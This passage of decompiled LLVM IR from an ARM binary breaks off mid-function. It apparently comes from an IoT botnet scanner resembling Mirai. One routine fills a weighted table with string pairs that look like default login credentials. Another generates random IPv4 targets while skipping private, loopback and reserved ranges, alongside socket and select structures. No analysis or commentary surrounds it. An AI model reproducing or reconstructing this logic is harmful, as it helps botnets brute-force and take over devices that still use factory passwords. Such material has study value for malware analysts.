  %v5_119a0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([9 x i8]* @global_var_143dc.296 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14428.312 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_119b0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_14428.312 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14430.314 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_119c0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_14430.314 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_14438.316 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_14448.318 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_119d0 = call i32 @function_11480(i32 ptrtoint ([14 x i8]* @global_var_14438.316 to i32), i32 ptrtoint ([7 x i8]* @global_var_14448.318 to i32), i32 1)
  store i32 ptrtoint ([8 x i8]* @global_var_14450.320 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_14450.320 to i32), i32* %r1.global-to-local, align 4
  %v5_119e0 = call i32 @function_11480(i32 ptrtoint ([8 x i8]* @global_var_14450.320 to i32), i32 ptrtoint ([8 x i8]* @global_var_14450.320 to i32), i32 1)
  store i32 ptrtoint ([11 x i8]* @global_var_14458.322 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_14458.322 to i32), i32* %r1.global-to-local, align 4
  %v5_119f0 = call i32 @function_11480(i32 ptrtoint ([11 x i8]* @global_var_14458.322 to i32), i32 ptrtoint ([11 x i8]* @global_var_14458.322 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_14464.324 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_14464.324 to i32), i32* %r1.global-to-local, align 4
  %v5_11a00 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_14464.324 to i32), i32 ptrtoint ([6 x i8]* @global_var_14464.324 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_14464.324 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143e8.298 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11a10 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_14464.324 to i32), i32 ptrtoint (i32* @global_var_143e8.298 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_14464.324 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143e8.298 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11a20 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_14464.324 to i32), i32 ptrtoint (i32* @global_var_143e8.298 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_1446c.326 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_143dc.296 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11a30 = call i32 @function_11480(i32 ptrtoint (i32* @global_var_1446c.326 to i32), i32 ptrtoint ([9 x i8]* @global_var_143dc.296 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_14474.328 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14428.312 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11a40 = call i32 @function_11480(i32 ptrtoint ([14 x i8]* @global_var_14474.328 to i32), i32 ptrtoint (i32* @global_var_14428.312 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_14420.310 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14420.310 to i32), i32* %r1.global-to-local, align 4
  %v3_11a50 = call i32 @function_11480(i32 ptrtoint (i32* @global_var_14420.310 to i32), i32 ptrtoint (i32* @global_var_14420.310 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_14564.280 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14564.280 to i32), i32* %r1.global-to-local, align 4
  %v3_11a60 = call i32 @function_11480(i32 ptrtoint (i32* @global_var_14564.280 to i32), i32 ptrtoint (i32* @global_var_14564.280 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14484.330 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14484.330 to i32), i32* %r1.global-to-local, align 4
  %v5_11a70 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14484.330 to i32), i32 ptrtoint ([5 x i8]* @global_var_14484.330 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1448c.332 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11a80 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_1448c.332 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14494.334 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11a90 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_14494.334 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1449c.336 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11aa0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_1449c.336 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_144a4.338 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11ab0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([6 x i8]* @global_var_144a4.338 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_144ac.340 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_11ac0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([5 x i8]* @global_var_144ac.340 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_144b4.342 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11ad0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([6 x i8]* @global_var_144b4.342 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144bc.344 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11ae0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_144bc.344 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144cc.346 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11af0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_144cc.346 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_144dc.348 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11b00 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([7 x i8]* @global_var_144dc.348 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_144e4.350 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11b10 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([5 x i8]* @global_var_144e4.350 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_144ec.352 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11b20 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([9 x i8]* @global_var_144ec.352 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_143f0.300 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11b30 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([5 x i8]* @global_var_143f0.300 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_144f8.354 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11b40 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([8 x i8]* @global_var_144f8.354 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14500.356 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11b50 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_14500.356 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1450c.358 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11b60 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint (i32* @global_var_1450c.358 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14428.312 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11b70 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint (i32* @global_var_14428.312 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143e8.298 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11b80 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint (i32* @global_var_143e8.298 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14590.290 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11b90 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint (i32* @global_var_14590.290 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14588.288 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11ba0 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint (i32* @global_var_14588.288 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_144cc.346 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11bb0 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint (i32* @global_var_144cc.346 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14514.360 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_11bc0 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint (i32* @global_var_14514.360 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_143f8.302 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11bd0 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint ([5 x i8]* @global_var_143f8.302 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_14448.318 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11be0 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint ([7 x i8]* @global_var_14448.318 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_14580.362 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14580.362 to i32), i32* %r1.global-to-local, align 4
  %v5_11bf0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14580.362 to i32), i32 ptrtoint ([5 x i8]* @global_var_14580.362 to i32), i32 1)
  store i32 ptrtoint ([7 x i8]* @global_var_1451c.364 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_14524.366 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_11c00 = call i32 @function_11480(i32 ptrtoint ([7 x i8]* @global_var_1451c.364 to i32), i32 ptrtoint ([7 x i8]* @global_var_14524.366 to i32), i32 1)
  %v2_11c08 = ptrtoint i32* %stack_var_-1862 to i32
  store i32 %v2_11c08, i32* %r0.global-to-local, align 4
  %v2_11c0c = ptrtoint i32* %stack_var_-1842 to i32
  store i32 %v2_11c0c, i32* %r1.global-to-local, align 4
  %tmp278 = bitcast i32* %stack_var_-1842 to i8*
  %v1_11f38 = add i32 %v2_11c08, 16
  %v2_11f38 = inttoptr i32 %v1_11f38 to i32*
  %v1_11f5c = or i32 %v2_11c0c, 1
  %v2_11f5c = inttoptr i32 %v1_11f5c to i8*
  %v1_11f80 = or i32 %v2_11c0c, 2
  %v2_11f80 = inttoptr i32 %v1_11f80 to i8*
  %v1_11f84 = or i32 %v2_11c0c, 3
  %v2_11f84 = inttoptr i32 %v1_11f84 to i8*
  %v1_11f48 = add i32 %v2_11c08, 9
  %v2_11f48 = inttoptr i32 %v1_11f48 to i8*
  %v1_11f98 = add i32 %v2_11c0c, 13
  %v2_11f98 = inttoptr i32 %v1_11f98 to i8*
  %v1_11fbc = add i32 %v2_11c0c, 8
  %v2_11fbc = inttoptr i32 %v1_11fbc to i32*
  %v1_11ffc = add i32 %v2_11c08, 12
  %v2_11ffc = inttoptr i32 %v1_11ffc to i32*
  %v2_12188 = ptrtoint i32* %stack_var_-36 to i32
  %v2_1220c = ptrtoint i32* %stack_var_-348 to i32
  %tmp314 = bitcast i32* %stack_var_-348 to %_TYPEDEF_fd_set*
  %v2_12214 = ptrtoint i32* %stack_var_-64 to i32
  %v2_12218 = ptrtoint i32* %stack_var_-220 to i32
  %tmp315 = bitcast i32* %stack_var_-220 to %_TYPEDEF_fd_set*
  %tmp317 = bitcast i32* %stack_var_-64 to %timeval*
  %v2_124a0 = ptrtoint i32* %stack_var_-41 to i32
  %v2_12c8c = ptrtoint i32* %stack_var_-84 to i32
  %v2_12c94 = ptrtoint i32* %stack_var_-73 to i32
  %v2_12808 = ptrtoint i32* %stack_var_-56 to i32
  %v2_128bc = ptrtoint i32* %stack_var_-48 to i32
  %v2_11ea0 = ptrtoint i32* %stack_var_-92 to i32
  %tmp279 = bitcast i32* %stack_var_-92 to %sockaddr*
  br label %dec_label_pc_11c18

dec_label_pc_11c18:                               ; preds = %dec_label_pc_12270, %dec_label_pc_11770
  %stack_var_-1872.0 = phi i32 [ %tmp240, %dec_label_pc_11770 ], [ %stack_var_-1872.1, %dec_label_pc_12270 ]
  store i32 ptrtoint (i32* @global_var_1cd44.239 to i32), i32* %r2.global-to-local, align 4
  store i32 %stack_var_-1872.0, i32* %r3.global-to-local, align 4
  %v2_11c20 = load i32, i32* @global_var_1cd44.239, align 4
  store i32 %v2_11c20, i32* @r8, align 4
  %v3_11c24 = icmp uge i32 %stack_var_-1872.0, %v2_11c20
  store i1 %v3_11c24, i1* %cpsr_c.global-to-local, align 1
  %v9_11c24 = icmp eq i32 %stack_var_-1872.0, %v2_11c20
  store i1 %v9_11c24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11c24, label %dec_label_pc_11ed0, label %dec_label_pc_11c2c

dec_label_pc_11c2c:                               ; preds = %dec_label_pc_11c18
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11c38

dec_label_pc_11c38:                               ; preds = %.thread49.dec_label_pc_11c38_crit_edge, %dec_label_pc_11c2c
  %v0_11c38 = phi i32 [ %v0_11c38.pre, %.thread49.dec_label_pc_11c38_crit_edge ], [ 0, %dec_label_pc_11c2c ]
  store i32 %v0_11c38, i32* %stack_var_-92, align 4
  store i32 %v0_11c38, i32* %stack_var_-84, align 4
  %v0_11c48 = call i32 @function_10b68()
  %v1_11c48 = trunc i32 %v0_11c48 to i8
  store i32 %v0_11c48, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd48.140 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd14.255 to i32), i32* %r1.global-to-local, align 4
  %v2_11c54 = load i32, i32* @global_var_1cd48.140, align 4
  store i32 %v2_11c54, i32* %r2.global-to-local, align 4
  %v2_11c58 = and i32 %v0_11c48, 128
  %v3_11c58 = icmp ne i32 %v2_11c58, 0
  store i1 %v3_11c58, i1* %cpsr_c.global-to-local, align 1
  %v4_11c58 = sdiv i32 %v0_11c48, 256
  store i32 %v4_11c58, i32* %r3.global-to-local, align 4
  %v1_11c5c = trunc i32 %v4_11c58 to i8
  store i8 %v1_11c5c, i8* bitcast (i32* @global_var_1cd19.262 to i8*), align 4
  store i32 %v2_11c54, i32* @global_var_1cd20.367, align 4
  store i8 %v1_11c48, i8* bitcast (i32* @global_var_1cd18.266 to i8*), align 4
  br label %dec_label_pc_11c68

dec_label_pc_11c68:                               ; preds = %dec_label_pc_11d3c, %dec_label_pc_11c98, %dec_label_pc_11d70, %dec_label_pc_11d64, %dec_label_pc_11d58, %dec_label_pc_11d4c, %.thread34, %bb298, %bb297, %bb296, %bb295, %bb294, %dec_label_pc_11d34, %dec_label_pc_11d2c, %bb290, %dec_label_pc_11cfc, %dec_label_pc_11cd8, %bb283, %dec_label_pc_11ca8, %bb282, %dec_label_pc_11c90, %bb281, %bb300, %dec_label_pc_11c38
  %v0_11c68 = call i32 @function_10b68()
  store i32 %v0_11c68, i32* %r0.global-to-local, align 4
  %v1_11c6c = urem i32 %v0_11c68, 256
  store i32 %v1_11c6c, i32* %r1.global-to-local, align 4
  %v3_11c70 = udiv i32 %v0_11c68, 256
  store i32 %v3_11c70, i32* %r3.global-to-local, align 4
  %v3_11c74 = udiv i32 %v0_11c68, 65536
  store i32 %v3_11c74, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11c78 = icmp eq i32 %v1_11c6c, 0
  store i1 %v2_11c78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c78, label %bb281, label %bb280

bb280:                                            ; preds = %dec_label_pc_11c68
  %v3_11c7c = icmp ugt i32 %v1_11c6c, 126
  store i1 %v3_11c7c, i1* %cpsr_c.global-to-local, align 1
  %v8_11c7c = icmp eq i32 %v1_11c6c, 127
  store i1 %v8_11c7c, i1* %cpsr_z.global-to-local, align 1
  br label %bb281

bb281:                                            ; preds = %dec_label_pc_11c68, %bb280
  %v0_11c8c = phi i1 [ true, %dec_label_pc_11c68 ], [ %v8_11c7c, %bb280 ]
  %v1_11c80 = urem i32 %v3_11c70, 256
  store i32 %v1_11c80, i32* %ip.global-to-local, align 4
  %v1_11c84 = urem i32 %v3_11c74, 256
  store i32 %v1_11c84, i32* %r2.global-to-local, align 4
  %v1_11c88 = and i32 %v0_11c68, 8388608
  %v2_11c88 = icmp ne i32 %v1_11c88, 0
  store i1 %v2_11c88, i1* %cpsr_c.global-to-local, align 1
  %v3_11c88 = udiv i32 %v0_11c68, 16777216
  store i32 %v3_11c88, i32* %r0.global-to-local, align 4
  br i1 %v0_11c8c, label %dec_label_pc_11c68, label %dec_label_pc_11c90

dec_label_pc_11c90:                               ; preds = %bb281
  %v2_11c90 = icmp ugt i32 %v1_11c6c, 2
  store i1 %v2_11c90, i1* %cpsr_c.global-to-local, align 1
  %v7_11c90 = icmp eq i32 %v1_11c6c, 3
  store i1 %v7_11c90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c90, label %dec_label_pc_11c68, label %dec_label_pc_11c98

dec_label_pc_11c98:                               ; preds = %dec_label_pc_11c90
  %v1_11c98 = add nsw i32 %v1_11c6c, -15
  store i32 %v1_11c98, i32* %r3.global-to-local, align 4
  %v2_11c9c = icmp ugt i32 %v1_11c6c, 55
  store i1 %v2_11c9c, i1* %cpsr_c.global-to-local, align 1
  %v7_11c9c = icmp eq i32 %v1_11c6c, 56
  store i1 %v7_11c9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c9c, label %dec_label_pc_11c68, label %bb282

bb282:                                            ; preds = %dec_label_pc_11c98
  %v3_11ca0 = icmp ne i32 %v1_11c98, 0
  store i1 %v3_11ca0, i1* %cpsr_c.global-to-local, align 1
  %v8_11ca0 = icmp eq i32 %v1_11c98, 1
  store i1 %v8_11ca0, i1* %cpsr_z.global-to-local, align 1
  %v2_11ca4 = xor i1 %v3_11ca0, true
  %v3_11ca4 = or i1 %v8_11ca0, %v2_11ca4
  br i1 %v3_11ca4, label %dec_label_pc_11c68, label %dec_label_pc_11ca8

dec_label_pc_11ca8:                               ; preds = %bb282
  %v2_11ca8 = icmp ugt i32 %v1_11c6c, 9
  store i1 %v2_11ca8, i1* %cpsr_c.global-to-local, align 1
  %v7_11ca8 = icmp eq i32 %v1_11c6c, 10
  store i1 %v7_11ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ca8, label %dec_label_pc_11c68, label %dec_label_pc_11cb0

dec_label_pc_11cb0:                               ; preds = %dec_label_pc_11ca8
  %v2_11cb0 = icmp ugt i32 %v1_11c6c, 191
  store i1 %v2_11cb0, i1* %cpsr_c.global-to-local, align 1
  %v7_11cb0 = icmp eq i32 %v1_11c6c, 192
  store i1 %v7_11cb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11cb0, label %bb283, label %dec_label_pc_11cbc

bb283:                                            ; preds = %dec_label_pc_11cb0
  %v3_11cb4 = icmp ugt i32 %v1_11c80, 167
  store i1 %v3_11cb4, i1* %cpsr_c.global-to-local, align 1
  %v8_11cb4 = icmp eq i32 %v1_11c80, 168
  store i1 %v8_11cb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11cb4, label %dec_label_pc_11c68, label %dec_label_pc_11cbc

dec_label_pc_11cbc:                               ; preds = %dec_label_pc_11cb0, %bb283
  %v7_11cbc = icmp eq i32 %v1_11c6c, 172
  %.354 = zext i1 %v7_11cbc to i32
  store i32 %.354, i32* %r3.global-to-local, align 4
  %v2_11cc8 = icmp ugt i32 %v1_11c80, 14
  store i1 %v2_11cc8, i1* %cpsr_c.global-to-local, align 1
  %v7_11cc8 = icmp eq i32 %v1_11c80, 15
  store i1 %v7_11cc8, i1* %cpsr_z.global-to-local, align 1
  %v2_11ccc = xor i1 %v2_11cc8, true
  %v3_11ccc = or i1 %v7_11cc8, %v2_11ccc
  br i1 %v3_11ccc, label %.thread12, label %bb286

.thread12:                                        ; preds = %dec_label_pc_11cbc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11ce0

bb286:                                            ; preds = %dec_label_pc_11cbc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11cd0 = icmp eq i1 %v7_11cbc, false
  store i1 %v2_11cd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11cd0, label %dec_label_pc_11ce0, label %dec_label_pc_11cd8

dec_label_pc_11cd8:                               ; preds = %bb286
  %v2_11cd8 = icmp ugt i32 %v1_11c80, 30
  store i1 %v2_11cd8, i1* %cpsr_c.global-to-local, align 1
  %v7_11cd8 = icmp eq i32 %v1_11c80, 31
  store i1 %v7_11cd8, i1* %cpsr_z.global-to-local, align 1
  %v2_11cdc = xor i1 %v2_11cd8, true
  %v3_11cdc = or i1 %v7_11cd8, %v2_11cdc
  br i1 %v3_11cdc, label %dec_label_pc_11c68, label %dec_label_pc_11ce0

dec_label_pc_11ce0:                               ; preds = %.thread12, %dec_label_pc_11cd8, %bb286
  %v7_11ce0 = icmp eq i32 %v1_11c6c, 100
  %.355 = zext i1 %v7_11ce0 to i32
  store i32 %.355, i32* %r3.global-to-local, align 4
  %v2_11cec = icmp ugt i32 %v1_11c80, 62
  store i1 %v2_11cec, i1* %cpsr_c.global-to-local, align 1
  %v7_11cec = icmp eq i32 %v1_11c80, 63
  store i1 %v7_11cec, i1* %cpsr_z.global-to-local, align 1
  %v2_11cf0 = xor i1 %v2_11cec, true
  %v3_11cf0 = or i1 %v7_11cec, %v2_11cf0
  br i1 %v3_11cf0, label %.thread17, label %bb289

.thread17:                                        ; preds = %dec_label_pc_11ce0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11d04

bb289:                                            ; preds = %dec_label_pc_11ce0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11cf4 = icmp eq i1 %v7_11ce0, false
  store i1 %v2_11cf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11cf4, label %dec_label_pc_11d04, label %dec_label_pc_11cfc

dec_label_pc_11cfc:                               ; preds = %bb289
  %v2_11cfc = icmp ugt i32 %v1_11c80, 125
  store i1 %v2_11cfc, i1* %cpsr_c.global-to-local, align 1
  %v7_11cfc = icmp eq i32 %v1_11c80, 126
  store i1 %v7_11cfc, i1* %cpsr_z.global-to-local, align 1
  %v2_11d00 = xor i1 %v2_11cfc, true
  %v3_11d00 = or i1 %v7_11cfc, %v2_11d00
  br i1 %v3_11d00, label %dec_label_pc_11c68, label %dec_label_pc_11d04

dec_label_pc_11d04:                               ; preds = %.thread17, %dec_label_pc_11cfc, %bb289
  %v2_11d04 = icmp ugt i32 %v1_11c6c, 168
  store i1 %v2_11d04, i1* %cpsr_c.global-to-local, align 1
  %v7_11d04 = icmp eq i32 %v1_11c6c, 169
  store i1 %v7_11d04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d04, label %bb290, label %dec_label_pc_11d10

bb290:                                            ; preds = %dec_label_pc_11d04
  %v3_11d08 = icmp eq i32 %v1_11c80, 255
